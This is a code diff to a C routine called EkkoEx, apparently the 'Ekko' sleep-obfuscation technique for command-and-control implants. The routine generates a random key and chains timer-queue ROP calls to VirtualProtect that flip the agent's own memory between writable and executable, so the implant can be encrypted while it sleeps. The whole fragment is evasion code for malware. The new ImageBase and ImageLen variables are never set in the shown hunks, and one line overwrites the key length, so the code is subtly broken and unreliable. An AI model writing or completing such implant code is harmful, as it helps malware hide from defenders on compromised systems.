@@ -21,18 +21,24 @@ VOID EkkoEx(
     DWORD    Delay     = { 0 };
     DWORD    Value     = { 0 };
 
+    /* image base and size */
+    PVOID ImageBase = NULL;
+    ULONG ImageLen  = 0;
+
     /* generate a new key */
     for ( int i = 0; i < 16; i++ ) {
         Rnd[ i ] = RandomNumber32( Instance );
     }
+
+
 
     /* set key buffer and size */
     Key.Buffer = Rnd;
     Key.Length = Key.MaximumLength = sizeof( Rnd );
 
     /* set image pointer and size */
-    Img.Buffer = NULL;                  /* address of your agent */
-    Img.Length = Key.MaximumLength = 0; /* size of agent memory */
+    Img.Buffer = ImageBase;                    /* address of your agent */
+    Img.Length = Key.MaximumLength = ImageLen; /* size of agent memory */
 
     /* create a timer queue */
     if ( ! NT_SUCCESS( RtlCreateTimerQueue( &Queue ) ) ) {
@@ -72,8 +78,8 @@ VOID EkkoEx(
 
             /* Protect */
             Rop[ 1 ].Rip = U_PTR( VirtualProtect );
-            Rop[ 1 ].Rcx = U_PTR( Instance->Session.BaseMemory.Buffer );
-            Rop[ 1 ].Rdx = U_PTR( Instance->Session.BaseMemory.Length );
+            Rop[ 1 ].Rcx = U_PTR( ImageBase );
+            Rop[ 1 ].Rdx = U_PTR( ImageLen  );
             Rop[ 1 ].R8  = U_PTR( PAGE_READWRITE );
             Rop[ 1 ].R9  = U_PTR( &Value );
 
@@ -95,8 +101,8 @@ VOID EkkoEx(
 
             /* Protect  */
             Rop[ 5 ].Rip = U_PTR( VirtualProtect );
-            Rop[ 5 ].Rcx = U_PTR( Instance->Session.BaseMemory.Buffer );
-            Rop[ 5 ].Rdx = U_PTR( Instance->Session.BaseMemory.Length );
+            Rop[ 5 ].Rcx = U_PTR( ImageBase );
+            Rop[ 5 ].Rdx = U_PTR( ImageLen  );
             Rop[ 5 ].R8  = U_PTR( PAGE_EXECUTE_READ );
             Rop[ 5 ].R9  = U_PTR( &Value );
 
